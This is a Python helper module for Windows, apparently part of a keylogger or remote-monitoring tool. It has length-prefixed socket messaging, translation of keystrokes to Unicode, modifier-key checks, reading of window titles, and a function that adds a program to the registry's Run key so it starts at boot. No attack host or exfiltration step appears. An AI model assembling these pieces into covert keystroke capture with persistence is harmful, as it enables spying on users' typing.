import winreg
from ctypes import windll, create_unicode_buffer
from threading import Thread
import win32api
from socket import *
import struct
from collections import OrderedDict
import keyboard


class Event:
    """
    Object styled dictionary for clearer code
    """

    def __init__(self, **entries): self.__dict__.update(entries)

    def __eq__(self, other): return self.__dict__ == other.__dict__

    def __neq__(self, other): return self.__dict__ != other.__dict__


def set_keepalive(sock):
    """
    Toggle on the keepalibe flag of input socket

    Args:
        sock: input socket to alter
    """
    sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)


def send_msg(sock, msg):
    """
    Sends a message padded with its size

    Args:
        msg: message to send
    """
    msg = msg.encode("utf-8")
    sock.sendall(struct.pack('!I', len(msg)) + msg)


def recv_msg(sock):
    """
    Reciebes a message that's padded with its size

    Returns:
        The sent message
    """
    raw_msglen = recvall(sock, struct.calcsize('!I'))
    if not raw_msglen:
        return None
    msglen = struct.unpack('!I', raw_msglen)[0]
    return recvall(sock, msglen).decode("utf-8")


def recvall(sock, n):
    """
    Reciebes n bytes from the connection

    Args:
        n: number of bytes to read
    """
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


def ToUnicode(sc):
    """
    Translates the birtual key code into a unicode character using the user's current keyboard locale

    Args:
        vk: the input birtual key code

    Returns:
        Unicode localed representation of the birtual key code
    """
    def _ToUnicode(results):
        b = create_unicode_buffer(1)
        if windll.user32.ToUnicode(win32api.MapVirtualKey(sc, 3), sc, win32api.GetKeyboardState(), b, 1, 0) == 1:
            results[0] = b.value
    results = [""]
    t = Thread(target=_ToUnicode, args=(results,))
    t.start()
    t.join()
    return results[0]


def get_modifiers():
    """
    Gets actibe keyboard modifier keys

    Returns:
        A dictionary containing the states of CTRL, SHIFT and ALT
    """
    ctrl_pressed = keyboard.is_pressed("ctrl")
    alt_pressed = keyboard.is_pressed("alt")
    shift_pressed = keyboard.is_pressed("shift")
    return OrderedDict([("ctrl", ctrl_pressed), ("shift", shift_pressed), ("alt", alt_pressed)])


def is_modifier(key):
    """
    Returns True if `key` is a name of a modifier key

    Args:
        key: name of the key

    Returns:
        True if `key` is a name of a modifier key
    """
    return key[key.find(" ")+1:] in keyboard.all_modifiers[:-1]  # ignore side + ignore windows


def GetWindowTextW(hwnd):
    """
    Gets the unicode title of a window

    Args:
        hwnd: handle to the window

    Returns:
        Unicode title
    """
    length = windll.user32.GetWindowTextLengthW(hwnd)
    buff = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value


def register_startup(name, path):
    """
    Registers a program to run on startup

    Args:
        name: the giben name to the startup object
        path: path to the file to startup
    """
    winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_ALL_ACCESS), name, 1, winreg.REG_SZ, '"%s"' % path)
